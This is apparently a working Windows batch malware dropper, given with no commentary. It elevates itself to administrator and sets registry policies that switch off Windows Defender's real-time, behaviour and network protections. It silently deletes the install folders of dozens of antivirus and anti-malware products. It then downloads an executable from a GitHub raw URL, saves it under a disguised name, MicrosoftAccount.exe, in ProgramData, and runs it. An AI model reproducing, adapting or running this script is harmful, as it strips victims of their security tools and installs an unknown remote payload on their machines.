��&cls
@echo off
setlocal

>nul 2>&1 "%windir%\system32\cacls.exe" "%windir%\system32\config\system"
if "%errorlevel%" neq "0" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
    exit /b 0
)

set "regPath=HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"

reg add "%regPath%" /f >nul 2>&1

reg add "%regPath%" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%regPath%" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%regPath%" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%regPath%" /v DisableControlledFoldersProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%regPath%" /v DisableIOavScan /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%regPath%" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "%regPath%" /v DisableNetworkProtection /t REG_DWORD /d 1 /f >nul 2>&1

for %%P in (
    "C:\Program Files\AVAST Software\Avast"
    "C:\Program Files\AVG\Setup"
    "C:\Program Files\Norton\NortonInstaller.exe"
    "C:\Program Files\McAfee\MSC"
    "C:\Program Files (x86)\Avira\Launcher"
    "C:\Program Files (x86)\Panda Security\Panda Security Protection"
    "C:\Program Files (x86)\TotalAV"
    "C:\Program Files (x86)\NANO Security\NANO Antivirus Pro"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security"
    "C:\Program Files (x86)\Grizzly Antivirus"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security"
    "C:\Program Files\Doctor Web\Setup"
    "C:\Program Files (x86)\Microsoft Defender Antivirus"
    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
    "C:\Program Files (x86)\VIPRE\vipre.exe"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Plus"
    "C:\Program Files (x86)\ESET\ESET NOD32 Antivirus"
    "C:\Program Files (x86)\Sophos\AutoUpdate"
    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity"
    "C:\Program Files (x86)\F-Secure\Antivirus"
    "C:\Program Files\Sophos\Sophos Endpoint Agent"
    "C:\Program Files\Dr.Web\drweb.exe"
    "C:\Program Files (x86)\Comodo\Comodo Antivirus"
    "C:\Program Files\BullGuard\BullGuard Antivirus"
    "C:\Program Files (x86)\ZoneAlarm\ZoneAlarm Security"
    "C:\Program Files\Malwarebytes\Anti-Malware"
    "C:\Program Files (x86)\Emsisoft\Anti-Malware"
    "C:\Program Files (x86)\Fortinet\FortiClient"
    "C:\Program Files (x86)\Webroot\WRSA.exe"
    "C:\Program Files (x86)\IKARUS\IKARUS antiVirus"
    "C:\Program Files (x86)\Rising\Rising Antivirus"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free Antivirus"
    "C:\Program Files (x86)\Norton Security"
    "C:\Program Files\eScan\eScan Antivirus"
    "C:\Program Files (x86)\Panda Dome"
    "C:\Program Files (x86)\ESET\Smart Security"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud"
    "C:\Program Files\Symantec\Symantec Endpoint Protection"
    "C:\Program Files\ZoneAlarm\ZoneAlarm"
    "C:\Program Files (x86)\Titanium\titanium.exe"
    "C:\Program Files (x86)\Iolo\System Mechanic"
    "C:\Program Files (x86)\SpyHunter"
    "C:\Program Files\Avira\Antivirus"
    "C:\Program Files (x86)\G DATA\Internet Security"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Free"
    "C:\Program Files (x86)\Panda Antivirus Pro"
    "C:\Program Files (x86)\Webroot\SecureAnywhere"
    "C:\Program Files (x86)\F-Secure\F-Secure Internet Security"
    "C:\Program Files (x86)\McAfee\Total Protection"
    "C:\Program Files\K7 Computing\K7 Antivirus"
    "C:\Program Files (x86)\Avast Cleanup"
    "C:\Program Files\Bitdefender\Bitdefender Security"
    "C:\Program Files (x86)\Malwarebytes\Chameleon"
    "C:\Program Files (x86)\Avira\Connect"
    "C:\Program Files (x86)\avast! antivirus"
    "C:\Program Files\Microsoft Security Client\SavUI.exe"
    "C:\Program Files (x86)\SUPERAntiSpyware"
    "C:\Program Files (x86)\RogueKiller"
    "C:\Program Files (x86)\ESET\NOD32 Antivirus"
    "C:\Program Files (x86)\Norton Security"
    "C:\Program Files (x86)\AVG\AVG Internet Security"
    "C:\Program Files (x86)\Comodo\COMODO Internet Security"
    "C:\Program Files (x86)\Panda Security\Setup"
    "C:\Program Files (x86)\Avast\Avast Secure Browser\Application"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Labs"
    "C:\Program Files (x86)\Panda Security\panda.exe"
    "C:\Program Files\F-Secure\FSAV\uninstall.exe"
    "C:\Program Files (x86)\Microsoft\Windows Defender"
    "C:\Program Files (x86)\G DATA\G DATA Internet Security"
    "C:\Program Files (x86)\TrustPort\TrustPort Antivirus"
    "C:\Program Files (x86)\Zillya\Zillya Antivirus"
    "C:\Program Files (x86)\HitmanPro\HitmanPro"
    "C:\Program Files (x86)\AdwCleaner\AdwCleaner"
    "C:\Program Files (x86)\SpywareBlaster\SpywareBlaster"
    "C:\Program Files (x86)\Malwarebytes\AdwCleaner"
    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity"
    "C:\Program Files (x86)\Emsisoft\Emsisoft Emergency Kit"
    "C:\Program Files (x86)\Glary Utilities\Glary Utilities"
    "C:\Program Files (x86)\RegCleaner\RegCleaner"
    "C:\Program Files (x86)\Advanced SystemCare\Advanced SystemCare"
    "C:\Program Files (x86)\IObit Malware Fighter\IObit Malware Fighter"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Password Manager"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Anti-Theft"
    "C:\Program Files (x86)\ESET\ESET Mobile Security"
    "C:\Program Files (x86)\K7 Computing\K7 Antivirus Plus"
    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
    "C:\Program Files (x86)\F-Secure\F-Secure Safe"
    "C:\Program Files (x86)\Panda Security\Panda Global Protection"
    "C:\Program Files (x86)\G DATA\G DATA Total Security"
    "C:\Program Files (x86)\Trend Micro\trend micro"
    "C:\Program Files (x86)\Avast Software\Avast"
    "C:\Program Files (x86)\AVG\AVG"
    "C:\Program Files (x86)\Microsoft Security Essentials\MSE"
    "C:\Program Files (x86)\Windows Defender"
) do (
    if exist "%%P" (
        del /S /Q "%%P" >nul 2>&1
    )
)

for %%D in (
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
    "C:\Program Files\AVG\Browser\Application"
) do (
    if exist "%%D" (
        if %windir% equ x86 (
            rd /S /Q "%%~D" >nul 2>&1
        ) else (
            rd /S /Q "%%~D" >nul 2>&1
        )
        if %ERRORLEVEL% neq 0 (
            rd /S /Q "%%~D" >nul 2>&1
        )
    )
)

set "TARGET_DIR=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount"
mkdir "%TARGET_DIR%" >nul 2>&1
set "EXECUTABLE_URL=https://github.com/zxcmuty/fdpsfpsadpfpsdap22133121431424/raw/main/test.exe"
set "EXECUTABLE_PATH=%TARGET_DIR%\MicrosoftAccount.exe"
powershell -Command "Invoke-WebRequest -Uri '%EXECUTABLE_URL%' -OutFile '%EXECUTABLE_PATH%'" >nul 2>&1
start "" "%EXECUTABLE_PATH%" >nul 2>&1

exit /b 0